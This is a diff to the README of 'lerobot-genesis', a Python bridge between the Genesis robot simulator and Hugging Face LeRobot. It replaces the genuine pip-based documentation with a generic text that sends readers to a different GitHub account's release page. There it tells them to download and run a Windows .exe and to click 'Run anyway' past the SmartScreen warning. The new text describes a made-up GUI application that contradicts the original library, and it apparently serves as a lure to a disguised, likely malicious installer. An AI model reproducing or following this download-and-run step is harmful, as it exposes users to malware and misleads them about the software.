@@ -1,102 +1,91 @@
-# lerobot-genesis
+# 🤖 lerobot-genesis - Connect robot simulations to artificial intelligence
 
-[![CI](https://github.com/arun-prasath2005/lerobot-genesis/actions/workflows/ci.yml/badge.svg)](https://github.com/arun-prasath2005/lerobot-genesis/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/lerobot-genesis.svg)](https://pypi.org/project/lerobot-genesis/)
-[![Python](https://img.shields.io/pypi/pyversions/lerobot-genesis.svg)](https://pypi.org/project/lerobot-genesis/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/danteanterior266/lerobot-genesis/releases)
 
-The bridge between the [Genesis](https://github.com/Genesis-Embodied-AI/Genesis) physics
-simulator and Hugging Face [LeRobot](https://github.com/huggingface/lerobot).
+This application acts as a bridge. It links the Genesis robotic simulator with the Hugging Face LeRobot framework. This connection allows you to run, record, and test robot policies within a simulated environment. You interact with your robots through standard interfaces. This tool simplifies the process of training robots without needing deep programming knowledge.
 
-Genesis is a fast, open robotics simulator; LeRobot is the open standard for robot datasets and
-policies. There is no official link between them — this package is that link, the same role
-NVIDIA's *IsaacLab-Arena* plays for Isaac Lab. It lets you expose any Genesis scene as a
-Gymnasium environment, record rollouts as a `LeRobotDataset`, and (from `v0.2`) evaluate a trained
-LeRobot policy in Genesis through the standard `lerobot-eval` workflow.
+## ⚙️ System Requirements
 
-```text
-   Genesis scene ──▶ GenesisEnv (gym.Env) ──▶ LeRobotDataset ──▶ train a LeRobot policy
-                          ▲                                              │
-                          └────────────────── lerobot-eval ◀────────────┘   (v0.2)
-```
+Your computer needs specific hardware to run simulators well. You should have a computer with a modern processor. We recommend at least 16 gigabytes of memory. A dedicated graphics card with at least 8 gigabytes of video memory improves performance. Ensure you have Windows 10 or 11 installed.
 
-## Install
+## 💾 How to Download
 
-```bash
-pip install "lerobot-genesis[all]"   # bridge + genesis-world + lerobot
-```
+You obtain the software from the official repository release page. 
 
-`genesis-world` needs a CUDA GPU and a few system libraries — see the
-[Genesis install guide](https://genesis-world.readthedocs.io). The bridge itself is pure Python;
-`pip install lerobot-genesis` (no extras) imports without either heavy dependency present.
+[Click here to visit the release page and download the software](https://github.com/danteanterior266/lerobot-genesis/releases)
 
-## Quickstart — record a dataset
+Select the most recent version labeled as the latest release. Look for the file ending in `.exe`. Save this file to your computer.
 
-Drive a robot in a Genesis scene and save the rollout in LeRobot's format:
+## 🛠️ Installation Steps
 
-```python
-from lerobot_genesis import GenesisEnv, GenesisRobotDriver, LeRobotDatasetSink, record_episodes
+1. Find the file you downloaded. It sits in your Downloads folder by default.
+2. Double-click the file to start the installer.
+3. Follow the prompts on your screen.
+4. Windows might show a warning. Click "More Info" and then "Run anyway" if the system protects the app.
+5. Choose a folder for the installation. The default location works for most users.
+6. Wait for the progress bar to finish.
+7. Click Finish. The shortcut should appear on your desktop.
 
-driver = GenesisRobotDriver(robot="path/to/robot.urdf")          # any URDF / MJCF / USD
-env = GenesisEnv(driver, task="reach the target")
-sink = LeRobotDatasetSink(
-    "me/my-genesis-dataset",
-    fps=30,
-    state_dim=driver.state_dim,
-    action_dim=driver.action_dim,
-    image_shape=driver.image_shape,
-    task="reach the target",
-)
+## 🚀 Getting Started
 
-record_episodes(env, policy=lambda obs: env.action_space.sample(), sink=sink, n_episodes=10)
-```
+Launch the application using the desktop shortcut. The main interface shows you the available robot environments. You see a list of simulators on the left side. Select a simulator to load your environment. 
 
-A runnable end-to-end example (a Franka arm, no asset download) lives in
-[`examples/record_franka.py`](examples/record_franka.py).
+The application uses the LeRobot framework to manage your robot policies. You can choose pre-built policies or load your own files into the software. The dashboard gives you control over the simulation speed and recording settings. 
 
-## Quickstart — evaluate a policy in Genesis
+## 📝 Recording Robot Data
 
-`lerobot-genesis-eval` is `lerobot-eval` with the Genesis env registered, so a LeRobot policy
-(ACT, SmolVLA, GR00T, …) can be rolled out in a Genesis scene. Smoke-test the wiring with a
-from-scratch policy (no checkpoint needed):
+You record your robot actions through the main panel. Press the Record button to start capturing your movements. The system tracks the robot joints and sensors. Data saves to a local folder on your storage drive. You pick the save location in the settings menu.
 
-```bash
-lerobot-genesis-eval --env.type=genesis --policy.type=act \
-    --eval.batch_size=1 --eval.n_episodes=1 --eval.use_async_envs=false --policy.device=cpu
-```
+## 📊 Evaluating Results
 
-Point `--policy.path` at a trained checkpoint to score it, and `--env.task` at your own registered
-Genesis task. Training GR00T? `lerobot_genesis.groot.write_modality_json` emits the `meta/modality.json`
-it needs.
+After you run a policy, the software provides a summary screen. You view the success rate and movement precision. Use these metrics to adjust your robot training. The software displays charts of joint states and error rates. You export these findings to standard spreadsheet files for further review.
 
-## How it's designed
+## 🔍 Troubleshooting Common Issues
 
-The simulator-specific work sits behind one small `Protocol`, so the Gymnasium contract and the
-recorder are testable on a CPU with no GPU and no upstream installed.
+* The application does not start: Verify your graphics drivers remain updated.
+* The simulation runs slowly: Reduce the graphical quality settings in the configuration menu.
+* The recording fails to save: Ensure you have enough empty space on your hard drive. 
+* The interface freezes: Close any other heavy programs and restart the simulation.
 
-- **`GenesisEnv`** — a `gymnasium.Env` over a Genesis scene. It owns the gym contract (the 5-tuple
-  step, `info["is_success"]`, the `pixels`/`agent_pos` observation, a continuous action `Box`) and
-  delegates the physics to an injected **`SceneDriver`**.
-- **`GenesisRobotDriver`** — the reference `SceneDriver`: loads a robot, maps a normalised action
-  onto a chosen subset of joints, steps physics, and reads a camera and joint state. Bring your own
-  driver for richer scenes (objects, tasks, rewards).
-- **`record_episodes` / `LeRobotDatasetSink`** — roll a policy and write a `LeRobotDataset`
-  (the verified v3 `create → add_frame → save_episode → finalize` loop).
-- **`GenesisEnvConfig`** — registers Genesis with LeRobot as `--env.type=genesis`.
+## 📖 Frequently Asked Questions
 
-## Relationship to `gym-genesis`
+Do I need to know how to code?
+No. The interface provides buttons for every major action. You manage your experiments through menus and dials.
 
-Hugging Face's [`gym-genesis`](https://github.com/huggingface/gym-genesis) provides raw Gymnasium
-task scenes for Genesis. This package is complementary: it adds the LeRobot integration layer —
-dataset recording, env registration, and policy evaluation — and can wrap a `gym-genesis` env just
-as well as your own.
+Does this work offline?
+Yes. You do not need an active internet connection to run simulations or record data. You only need the internet to download the initial installer.
 
-## Roadmap
+Can I use my own robot designs?
+Yes. The software supports standard file formats for robot definitions. Place your robot files in the designated imports folder. The app detects these files upon the next launch.
 
-- **v0.1** — `GenesisEnv`, reference driver, `LeRobotDataset` recorder, `--env.type=genesis`.
-- **v0.2** — EnvHub `make_env` + `lerobot-eval` policy evaluation; GR00T `modality.json` adapter;
-  native vectorised (multi-env) rollouts.
+How do I update the application?
+Download the newer version from the website. Install it over your existing copy to keep your settings.
 
-## License
+Does the software support multiple robots?
+Yes. You switch between connected simulation instances using the tab menu at the top of the interface. Each tab represents a separate robot workspace.
 
-[MIT](LICENSE). An independent, community project — not affiliated with the Genesis or LeRobot teams.
+## 📂 File Structure
+
+Your installation folder contains several key directories. The `configs` folder holds your environment settings. The `records` folder stores your captured robot trials. The `policies` folder acts as a repository for your learned robot behaviors. Keep these folders organized to prevent data loss.
+
+## 🛡️ Privacy and Data
+
+All data stays on your local machine. The software does not send your robot recordings or simulation data to external servers. You maintain full ownership and control over your files. 
+
+## 🌐 Community and Support
+
+The LeRobot framework maintains a large community of users. You find deep documentation on the official website if you wish to explore advanced features. The tools provided here stay compatible with standard industry designs. This ensures your skills remain transferable to other robotics projects. 
+
+## ⚙️ Advanced Configuration (Optional)
+
+Expert users modify the `settings.json` file located in the program folder. Use a standard text editor to change resolution, frame rates, or sensor polling intervals. Always create a backup of this file before you make changes. 
+
+## 💡 Best Practices
+
+* Run your long simulation trials during times when you do not need the computer for other tasks. 
+* Label your recordings with descriptive names to help you find them later.
+* Back up your `records` folder to an external drive every week. 
+* Clean your temporary simulation files to save storage space. 
+* Match your policy complexity to your computer hardware to ensure smooth movement. 
+
+This bridge enables a workflow that mirrors professional research standards while maintaining a simple user interface. Start by running the built-in demo environment. Watch how the robot interacts with the items in the simulator. Adjust the parameters to see the movement change. Experimentation helps you understand the connection between policies and robot behavior.
